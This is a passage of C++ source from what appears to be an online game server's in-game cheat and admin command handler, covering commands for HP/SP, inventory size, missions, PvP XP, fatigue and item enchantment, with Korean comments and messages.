			CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
			if(!pTask) return false;

			EtVector3* pvPos = m_pSession->GetActorHandle()->GetPosition();
			pTask->RequestGenerationNpc(nNpcID, pvPos->x, pvPos->y, pvPos->z, 0);
#endif
		}
		break;

	case ADD_STATEEFFECT:
		{
#ifdef _GAMESERVER
			if( tokens.size() != 4 )
				return false;

			int iStateEffectIndex = _ttoi(tokens[1].c_str());
			int iDurationTime = _ttoi(tokens[2].c_str());
			
			if((int)tokens.size() > 2 )
			{
				const TCHAR* pParameter = tokens[3].c_str();
				int iCodePage = CEtResourceMng::GetInstance().GetCodePage();
				char acBuf[ 256 ];
				ZeroMemory( acBuf, sizeof(acBuf) );
				WideCharToMultiByte( iCodePage, 0, pParameter, -1, acBuf, sizeof(acBuf), NULL, NULL );

				CDNGameRoom *pRoom = m_pSession->GetGameRoom();
				if(!pRoom) return false;
				if(!pRoom->GetTaskMng()) return false;

				DnActorHandle hActor = m_pSession->GetActorHandle();
				hActor->CmdAddStateEffect( /*hActor,*/ NULL, (STATE_BLOW::emBLOW_INDEX)iStateEffectIndex, iDurationTime, acBuf );
			}
#endif
		}
		break;

	case NOTICE:
		{
			if(tokens.size() < 2)
				return false;

			WCHAR szMsg[CHATLENMAX];
			int nLen = 0;
			for (int i = 1; i <(int)tokens.size(); i++)
			{
				int nTempLen = (int)wcslen(tokens[i].c_str());
				if(nTempLen + nLen >= CHATLENMAX)
					return false;
				_wcscpy(szMsg+nLen, CHATLENMAX-nLen, tokens[i].c_str(), nTempLen);
				nLen += nTempLen;
				szMsg[nLen++] = ' ';
			}
			if( nLen < CHATLENMAX )
				szMsg[nLen] = '\0';
			else
				return false;

#if defined(_VILLAGESERVER)
			g_pMasterConnection->SendNoticeFromClient(szMsg, nLen);
#elif defined(_GAMESERVER)
			g_pMasterConnectionManager->SendNoticeFromClinet(szMsg, nLen);
#endif
		}
		break;

	case ADDINVENCOUNT:
		{
			if(tokens.size() < 2) return false;
			int nCount = _ttoi(tokens[1].c_str());
			if(nCount > INVENTORYMAX) return false;

			m_pSession->GetItem()->SetInventoryCount(nCount);
			m_pSession->SendInventoryMaxCount(nCount);
		}
		break;

	case ADDWARECOUNT:
		{
			if(tokens.size() < 2) return false;
			int nCount = _ttoi(tokens[1].c_str());
			if(nCount > WAREHOUSEMAX) return false;

			m_pSession->GetItem()->SetWarehouseCount(nCount);
			m_pSession->SendWarehouseMaxCount(nCount);
		}
		break;

	case REBIRTH:
		{
			if(tokens.size() < 4) return false;
			int nRebirth = (tokens.size() <= 1) ? 1 : _ttoi(tokens[1].c_str());
			if(nRebirth <= 0) nRebirth = 1;
			int nPCBang = (tokens.size() <= 2) ? 1 : _ttoi(tokens[2].c_str());
			if(nPCBang <= 0) nPCBang = 1;
			int nCash = (tokens.size() <= 3) ? 1 : _ttoi(tokens[3].c_str());
			if(nCash <= 0) nCash = 1;

			m_pSession->SetRebirthCoin(nRebirth, nPCBang, nCash);
			m_pSession->GetDBConnection()->QueryRebirthCoin(m_pSession, nRebirth, nPCBang, 0);
			m_pSession->SendRebirthCoin(ERROR_NONE, 0, _REBIRTH_SELF, m_pSession->GetSessionID());
		}
		break;

#if defined(_GAMESERVER )
		case RESPAWNLOGIC:
		{

			if( tokens.size() != 1 ) 
				return false;

			if( !m_pSession || !m_pSession->GetGameRoom() )
				return false;

			CDnGameTask* pGameTask = m_pSession->GetGameRoom()->GetGameTask();
			if( !pGameTask )
				return false;

			if( pGameTask->GetGameTaskType() != GameTaskType::PvP ) 
				return false;

			CPvPRespawnLogic* pRespawnLogic = ((CDnPvPGameTask*)pGameTask)->GetRespawnLogic();
			if( !pRespawnLogic )
				return false;

			pRespawnLogic->ToggleCheat();

			break;
		}

		case SETCULLING:
			{
				if( tokens.size() < 2 ) 
					return false;

				if( !m_pSession || !m_pSession->GetGameRoom() )
					return false;

				m_pSession->GetGameRoom()->SetActorTick(_ttoi(tokens[1].c_str()));
				m_pSession->GetGameRoom()->SetCullingDistance(_ttoi(tokens[2].c_str()));
			}
			break;
#endif
		
#if defined( _VILLAGESERVER )
		case GETPVPSCORE:
		{
			/*
			BYTE	cLevel;												// 레벨
			UINT	uiXP;												// XP
			UINT	uiPlayTimeSec;										// 플레이타임(초)
			UINT	uiWin;												// 승리
			UINT	uiLose;												// 패배
			UINT	uiDraw;												// 무승부
			UINT	uiGiviUpCount;										// 중간이탈수
			UINT	uiKOClassCount[PvPCommon::Common::MaxClass];		// 각 클래스를 KO시킨 횟수
			UINT	uiKObyClassCount[PvPCommon::Common::MaxClass];		// 각 클래스에게 KO당한 회수
			INT64	biTotalKillPoint;
			INT64	biTotalAssistPoint;
			INT64	biTotalSupportPoint;
			*/

			TPvPGroup* pPvP = m_pSession->GetPvPData();

			wchar_t wszBuf[MAX_PATH];
			wsprintf( wszBuf, L"[레벨:%d,XP:%d] %d승 %d패 %d무 %d기권 PlayTime:%d초", pPvP->cLevel, pPvP->uiXP, pPvP->uiWin, pPvP->uiLose, pPvP->uiDraw, pPvP->uiGiveUpCount, pPvP->uiPlayTimeSec );
			m_pSession->SendDebugChat( wszBuf );

			wsprintf( wszBuf, L"[KO] 워리어:%d 아처:%d 소서리스:%d 클레릭:%d", pPvP->uiKOClassCount[0], pPvP->uiKOClassCount[1], pPvP->uiKOClassCount[2], pPvP->uiKOClassCount[3] );
			m_pSession->SendDebugChat( wszBuf );

			wsprintf( wszBuf, L"[KO_By] 워리어:%d 아처:%d 소서리스:%d 클레릭:%d", pPvP->uiKObyClassCount[0], pPvP->uiKObyClassCount[1], pPvP->uiKObyClassCount[2], pPvP->uiKObyClassCount[3] );
			m_pSession->SendDebugChat( wszBuf );

			wsprintf( wszBuf, L"TotalKillPoint=%I64d TotalAssistPoint=%I64d TotalSupportPoint=%I64d", pPvP->biTotalKillPoint, pPvP->biTotalAssistPoint, pPvP->biTotalSupportPoint );
			m_pSession->SendDebugChat( wszBuf );

			break;
		}
#endif
		case ENABLESHADOW:
		{
#ifdef _GAMESERVER
			#ifdef _SHADOW_TEST
			if(tokens.size() < 1) return false;
			bool bEnable = true;
			if( tokens.size() >= 2 )
				bEnable = ( _ttoi(tokens[1].c_str()) == 0 ) ? false : true;
			g_bEnableShadow[m_pSession->GetRoomID()] = bEnable;
			#endif
#endif
		}
		break;

	case FATIGUE:
		{
			if(tokens.size() < 4) return false;
			int nFatigue = (tokens.size() <= 1) ? 1 : _ttoi(tokens[1].c_str());
			if(nFatigue <= 0) nFatigue = 1;
			int nWeekly = (tokens.size() <= 2) ? 1 : _ttoi(tokens[2].c_str());
			if(nWeekly <= 0) nWeekly = 1;
			int nPCBang = (tokens.size() <= 3) ? 1 : _ttoi(tokens[3].c_str());
			if(nPCBang <= 0) nPCBang = 1;
			int nEvent = (tokens.size() <= 4) ? 1 : _ttoi(tokens[4].c_str());
			if(nEvent <= 0) nEvent = 1;
			
#if defined(PRE_ADD_VIP)
			int nVIP = (tokens.size() <= 5) ? 1 : _ttoi(tokens[5].c_str());
			if(nVIP <= 0) nEvent = 1;

			m_pSession->SetCheatFatigue(nFatigue, nWeekly, nPCBang, nEvent, nVIP);

#else	// #if defined(PRE_ADD_VIP)
			m_pSession->SetCheatFatigue(nFatigue, nWeekly, nPCBang, nEvent, 0);
#endif	// #if defined(PRE_ADD_VIP)
		}
		break;

	case IGNORECOOLTIME:
		{
#if defined(_GAMESERVER)
			DnActorHandle hActor = m_pSession->GetActorHandle();
			//hActor->ResetSkillCoolTime();
			hActor->IgnoreSkillCoolTime();
#endif
		}
		break;

	case FCM:
		{
#if defined(_CH)
			if(tokens.size() < 1) return false;

			wstring wszString;
			wszString = FormatW( L"FCMState: %d FCMOnline: %d", m_pSession->GetFCMState(), m_pSession->GetFCMOnlineMin());
			m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
		}
		break;

	case SETFCM:
		{
#if defined(_CH)
			if(tokens.size() < 2) return false;

			int nMin = _ttoi(tokens[1].c_str());

			wstring wszString;
			m_pSession->SetFCMOnlineMin(nMin, true);
			wszString = FormatW( L"FCMState: %d FCMOnline: %d", m_pSession->GetFCMState(), m_pSession->GetFCMOnlineMin());
			m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
		}
		break;

	case SET_HP:
		{
#ifdef _GAMESERVER
			wstring wszString;

			if( tokens.size() < 2 ){
				wszString = FormatW(L"HP 값(비율0~100)을 넣어주세요.\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDnPlayerActor *pPlayer = m_pSession->GetPlayerActor();
			if( !pPlayer ) break;
			INT64 nHP = (INT64)( pPlayer->GetMaxHP() *( _ttoi( tokens[1].c_str() ) / 100.f ) );
			if( nHP > pPlayer->GetMaxHP() ) nHP = pPlayer->GetMaxHP();
			else if( nHP < 1 ) nHP = 1;
			pPlayer->CmdRefreshHPSP( nHP, pPlayer->GetSP() );
#endif
		}
		break;
	case SET_MP:
		{
#ifdef _GAMESERVER
			wstring wszString;

			if( tokens.size() < 2 ){
				wszString = FormatW(L"SP 값(비율0~100)을 넣어주세요.\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDnPlayerActor *pPlayer = m_pSession->GetPlayerActor();
			if( !pPlayer ) break;
			int nSP = (int)( pPlayer->GetMaxSP() *( _ttoi( tokens[1].c_str() ) / 100.f ) );
			if( nSP > pPlayer->GetMaxSP() ) nSP = pPlayer->GetMaxSP();
			else if( nSP < 1 ) nSP = 1;
			pPlayer->CmdRefreshHPSP( pPlayer->GetHP(), nSP );
#endif
		}
		break;
	case SET_HPMPFULL:
		{
#if defined( _GAMESERVER )
			CDnPlayerActor *pPlayer = m_pSession->GetPlayerActor();
			if( !pPlayer ) 
				break;
			pPlayer->CmdRefreshHPSP( pPlayer->GetMaxHP(), pPlayer->GetMaxSP() );
#endif // #if defined( _GAMESERVER )
			break;
		}
	case GET_HP:
		{
#ifdef _GAMESERVER

			CDNGameRoom* pGameRoom = m_pSession->GetGameRoom();
			if( !pGameRoom )
				return false;

			std::wstring wstrCharName = m_pSession->GetCharacterName();

			if( tokens.size() == 2 )
				wstrCharName = tokens[1];

			CDNGameRoom::PartyStruct* pStruct = pGameRoom->GetPartyData( const_cast<WCHAR*>(wstrCharName.c_str()) );
			if( !pStruct || !pStruct->pSession )
				return false;

			DnActorHandle hActor = pStruct->pSession->GetActorHandle();
			if( !hActor )
				return false;

			INT64 iHP = hActor->GetHP();
			INT64 iMaxHP = hActor->GetMaxHP();

			WCHAR wszBuf[MAX_PATH];
			wsprintf( wszBuf, L"[%s] HP:%I64d/%I64d", wstrCharName.c_str(), iHP, iMaxHP );
			m_pSession->SendDebugChat( wszBuf );
#endif
			break;
		}
	case GAINMISSION:
	case ACHIEVEMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			if( nCmdID  == GAINMISSION ) pMission->RequestForceGainMission( _ttoi(tokens[1].c_str()) );
			else pMission->RequestForceAchieveMission( _ttoi(tokens[1].c_str()) );
		}
		break;
	case GAINDAILYMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"일일 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			switch( tokens.size() ) {
			case 2: pMission->RequestForceGainDailyMission( 1, _ttoi(tokens[1].c_str()) ); break;
			case 3: pMission->RequestForceGainDailyMission( 2, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()) ); break;
			case 4: pMission->RequestForceGainDailyMission( 3, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()) ); break;
			case 5: pMission->RequestForceGainDailyMission( 4, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()) ); break;
			case 6: pMission->RequestForceGainDailyMission( 5, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()) ); break;
			case 7: pMission->RequestForceGainDailyMission( 6, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()) ); break;
			case 8: pMission->RequestForceGainDailyMission( 7, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()) ); break;
			case 9: pMission->RequestForceGainDailyMission( 8, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()) ); break;
			case 10: pMission->RequestForceGainDailyMission( 9, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()) ); break;
			case 11: pMission->RequestForceGainDailyMission( 10, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()), _ttoi(tokens[10].c_str()) ); break;
			}

			m_pSession->GetDBConnection()->QuerySetDailyMission( m_pSession );
		}
		break;
	case ACHIEVEDAILYMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"일일 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			pMission->RequestForceAchieveDailyMission( _ttoi(tokens[1].c_str()) );
		}
		break;
	case GAINWEEKLYMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"주간 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			switch( tokens.size() ) {
			case 2: pMission->RequestForceGainWeeklyMission( 1, _ttoi(tokens[1].c_str()) ); break;
			case 3: pMission->RequestForceGainWeeklyMission( 2, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()) ); break;
			case 4: pMission->RequestForceGainWeeklyMission( 3, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()) ); break;
			case 5: pMission->RequestForceGainWeeklyMission( 4, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()) ); break;
			case 6: pMission->RequestForceGainWeeklyMission( 5, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()) ); break;
			case 7: pMission->RequestForceGainWeeklyMission( 6, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()) ); break;
			case 8: pMission->RequestForceGainWeeklyMission( 7, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()) ); break;
			case 9: pMission->RequestForceGainWeeklyMission( 8, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()) ); break;
			case 10: pMission->RequestForceGainWeeklyMission( 9, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()) ); break;
			case 11: pMission->RequestForceGainWeeklyMission( 10, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()), _ttoi(tokens[10].c_str()) ); break;
			}
			
			m_pSession->GetDBConnection()->QuerySetWeeklyMission( m_pSession );
		}
		break;
	case ACHIEVEWEEKLYMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"주간 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			pMission->RequestForceAchieveWeeklyMission( _ttoi(tokens[1].c_str()) );
		}
		break;
#if defined(PRE_ADD_MONTHLY_MISSION)
	case GAIN_MONTHLY_MISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"월간 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			switch( tokens.size() ) {
				case 2: pMission->RequestForceGainMonthlyMission( 1, _ttoi(tokens[1].c_str()) ); break;
				case 3: pMission->RequestForceGainMonthlyMission( 2, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()) ); break;
				case 4: pMission->RequestForceGainMonthlyMission( 3, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()) ); break;
				case 5: pMission->RequestForceGainMonthlyMission( 4, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()) ); break;
				case 6: pMission->RequestForceGainMonthlyMission( 5, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()) ); break;
				case 7: pMission->RequestForceGainMonthlyMission( 6, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()) ); break;
				case 8: pMission->RequestForceGainMonthlyMission( 7, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()) ); break;
				case 9: pMission->RequestForceGainMonthlyMission( 8, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()) ); break;
				case 10: pMission->RequestForceGainMonthlyMission( 9, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()) ); break;
				case 11: pMission->RequestForceGainMonthlyMission( 10, _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), _ttoi(tokens[3].c_str()), _ttoi(tokens[4].c_str()), _ttoi(tokens[5].c_str()), _ttoi(tokens[6].c_str()), _ttoi(tokens[7].c_str()), _ttoi(tokens[8].c_str()), _ttoi(tokens[9].c_str()), _ttoi(tokens[10].c_str()) ); break;
			}

			m_pSession->GetDBConnection()->QuerySetMonthlyMission( m_pSession );
		}
		break;

	case ACHIEVE_MONTHLY_MISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"월간 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			pMission->RequestForceAchieveMonthlyMission( _ttoi(tokens[1].c_str()) );
		}
		break;
#endif
	case ACHIEVEGUILDMISSION:
		{
			if( tokens.size() < 2 ){
				wstring wszString = FormatW(L"길드전 미션 인덱스를 넣어주세요\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

			CDNMissionSystem *pMission = m_pSession->GetMissionSystem();
			if(pMission->bIsGuildWarMission())
				pMission->RequestForceAchieveGuildWarMission( _ttoi(tokens[1].c_str()) );
			else
			{
				wstring wszString = FormatW(L"길드전 미션 진행기간이 아닙니다.\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
		}
		break;
	case MAKE_GUILDFESTIVAL_POINT :
		{
			if( tokens.size() != 2 )
				return false;

			int nFestivalPoint = _ttoi(tokens[1].c_str());

			// 추가 길드 축제 포인트
			const TGuildUID GuildUID = m_pSession->GetGuildUID();
			CDNGuildBase* pGuild = g_pGuildManager->At(GuildUID);
			if(pGuild)
			{
#if !defined( PRE_ADD_NODELETEGUILD )
				CDetachAutoEx<CDNGuildBase>	AutoDetach(pGuild);
				if ( pGuild->IsEnable() )
				{
#endif
					TGuildRewardItem* GuildRewardItem = pGuild->GetGuildRewardItem();
					if( GuildRewardItem[GUILDREWARDEFFECT_TYPE_EXTRAFESTPOINT].nItemID > 0 &&
						GuildRewardItem[GUILDREWARDEFFECT_TYPE_EXTRAFESTPOINT].nEffectValue > 0 )
					{
						nFestivalPoint += (int)(nFestivalPoint * GuildRewardItem[GUILDREWARDEFFECT_TYPE_EXTRAFESTPOINT].nEffectValue * 0.01);
					}
#if !defined( PRE_ADD_NODELETEGUILD )
				}				
#endif
			}
			m_pSession->AddEtcPoint(DBDNWorldDef::EtcPointCode::GuildWar_Festival, nFestivalPoint);
		}
		break;
	case FORCERANK:
		{
#ifdef _GAMESERVER
#if defined(_WORK) || defined(_KRAZ)
		if( tokens.size() < 2 ){
			wstring wszString = FormatW(L"랭크 넣어주세요(0:SSS ~ 6:D), -1:치트안먹힘.\r\n");
			m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
			return false;
		}

		CDnPlayerActor *pPlayer = m_pSession->GetPlayerActor();
		pPlayer->m_cForceDungeonClearRank = (char)_ttoi(tokens[1].c_str());
#endif //#if defined(_WORK) || defined(_KRAZ)
#endif
		break;
		}
		case ADD_XP:
		{
#if defined( _GAMESERVER )
			if( tokens.size() != 2 )
			{
				wstring wszString = FormatW(L"증가시킬 XP 값을 입력해주세요.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
				return false;
			}

			// lexical_cast 예외 처리
			if( tokens[1].size() > 9)
				tokens[1] = L"999999999";

			int iAddXP = boost::lexical_cast<int>( tokens[1].c_str() );
			if( iAddXP <= 0 )
			{
				wstring wszString = FormatW(L"0보다 큰 XP값을 입력해주세요.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
				return false;
			}

			TPvPGroup* pPvPData = m_pSession->GetPvPData();

			pPvPData->uiXP += iAddXP;

			// PvP_Level
			for( UINT i=pPvPData->cLevel ; i<PvPCommon::Common::MaxRank ; ++i )
			{
				const TPvPRankTable* pPvPRankTable = g_pDataManager->GetPvPRankTable( i );
				if( !pPvPRankTable )
					return false;

#ifdef PRE_MOD_PVPRANK
				//치트쪽 처리해야함
				if (pPvPRankTable->cType != PvPCommon::RankTable::ExpValue)
					continue;

				if( pPvPData->uiXP >= pPvPRankTable->uiXP )
#if defined(PRE_ADD_PVPLEVEL_MISSION)
					m_pSession->SetPvPLevel(static_cast<BYTE>(i+1));
#else
					pPvPData->cLevel = static_cast<BYTE>(i+1);
#endif
				else
					break;
#else		//#ifdef PRE_MOD_PVPRANK
				if( pPvPData->uiXP >= pPvPRankTable->uiXP )
#if defined(PRE_ADD_PVPLEVEL_MISSION)
					m_pSession->SetPvPLevel(static_cast<BYTE>(i+1));
#else
					pPvPData->cLevel = static_cast<BYTE>(i+1);
#endif
				else
					break;
#endif		//#ifdef PRE_MOD_PVPRANK
			}

			CDNDBConnection* pDBCon = m_pSession->GetDBConnection();
			if( pDBCon )
				pDBCon->QueryUpdatePvPData( m_pSession->GetDBThreadID(), m_pSession, PvPCommon::QueryUpdatePvPDataType::Max );
#else
			wstring wszString = FormatW(L"마을에서는 사용가능한 치트키가 아닙니다.\r\n");
			m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
#endif
			break;
		}
		case STAGECLEAR:
			{
#ifdef _GAMESERVER
#ifdef _TEST_CODE_KAL
				if( tokens.size() < 2 ){
					wstring wszString = FormatW(L"랭크 넣어주세요(0:SSS ~ 6:D), -1:치트안먹힘.\r\n");
					m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
					return false;
				}

				CDNGameRoom *pRoom = m_pSession->GetGameRoom();
				if(!pRoom) return false;
				if(!pRoom->GetTaskMng()) return false;

				CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
				if(!pTask) return false;

				int rank = _ttoi(tokens[1].c_str());
				int difficulty = 4;

				pTask->RequestDungeonClear_ForCheat(64, 29771, 1, -1, 1, 2, rank, difficulty);
#endif
#endif
			}
			break;
		case SET_ENCHANT:
			{
#ifdef _VILLAGESERVER
				if( tokens.size() < 2 ) {
					break;
				}
				int nInvenSlot = _wtoi( tokens[1].c_str() );
				int nLevel = ( tokens.size() >= 3 ) ? _wtoi( tokens[2].c_str() ) : -1;
//				if( nLevel < 1 ) nLevel = -1;
				int nPotential = ( tokens.size() >= 4 ) ? _wtoi( tokens[3].c_str() ) : -1;

				if( nInvenSlot < 0 || nInvenSlot >= INVENTORYMAX ) break;
				CDNUserItem *pUserItem = m_pSession->GetItem();
				const TItem *pItem = pUserItem->GetInventory( nInvenSlot );
				if( !pItem ) break;
				TItemData *pItemData = g_pDataManager->GetItemData( pItem->nItemID );
				if( !pItemData ) break;

				TEnchantData *pEnchantData = g_pDataManager->GetEnchantData( pItemData->nEnchantID );
				if( !pEnchantData ) break;

				if( nLevel == -1 ) 
					const_cast<TItem*>(pItem)->cLevel = 1 +( rand()%pEnchantData->cCount );
				else {
					if( nLevel > pEnchantData->cCount ) nLevel = pEnchantData->cCount;
					const_cast<TItem*>(pItem)->cLevel = (char)nLevel;
				}
				if( pItem->cLevel > 0 ) {
#ifdef PRE_FIX_MEMOPT_ENCHANT
					DWORD potentialID = g_pDataManager->GetItemTypeParam2(pItem->nItemID);
					TPotentialData* pPotentialData = g_pDataManager->GetPotentialData(potentialID);
#else
					TEnchantLevelData *pEnchantLevelData = g_pDataManager->GetEnchantLevelData( pItemData->nEnchantID, pItem->cLevel );
					if( !pEnchantLevelData ) break;
					TPotentialData *pPotentialData = g_pDataManager->GetPotentialData( pEnchantLevelData->nPotentialID );
#endif
					if( !pPotentialData ) 
						break;
					if( nPotential == -1 ) 
					{
						if( pPotentialData->pVecItemData.size() == 0 )
							break;
						const_cast<TItem*>(pItem)->cPotential = (char)( 1 +( rand()%pPotentialData->pVecItemData.size() ) );
					}
					else {
						if( nPotential >(int)pPotentialData->pVecItemData.size() ) nPotential = (int)pPotentialData->pVecItemData.size();
						const_cast<TItem*>(pItem)->cPotential = (char)nPotential;
					}
				}
				else 
					const_cast<TItem*>(pItem)->cPotential = 0;
				m_pSession->SendRefreshInven((BYTE)nInvenSlot, pItem, false );
#endif
			}
